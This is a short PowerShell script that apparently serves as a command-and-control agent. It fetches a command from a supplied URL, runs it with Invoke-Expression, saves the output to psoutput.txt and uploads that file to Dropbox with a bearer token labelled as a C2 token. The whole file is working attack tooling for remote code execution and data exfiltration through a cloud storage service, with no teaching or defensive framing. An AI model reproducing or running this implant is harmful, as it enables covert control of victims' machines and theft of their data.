
Param(
    [Parameter(Mandatory=$true)]
    [string]$C2GB_token,
    [Parameter(Mandatory=$true)]
    [string]$cmd_source
)

$BASEDIR = pwd
$cmd = Invoke-webrequest -URI "$cmd_source"
Write-Host "Test del comando" + $cmd

if ( "$cmd" -eq 'NOP')
{
    Write-Host $cmd
}
else
{
    $content = Invoke-Expression $cmd
    Write-Host $content
    $content | Out-File -FilePath "$BASEDIR\psoutput.txt"

    # set args
    $TargetFilePath = '/psoutput.txt'
    $args = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $auth = "Bearer " + $C2GB_token
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $auth)
    $headers.Add("Dropbox-API-Arg", $args)
    $headers.Add("Content-Type", 'application/octet-stream')

    # send file
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile .\psoutput.txt -Headers $headers
}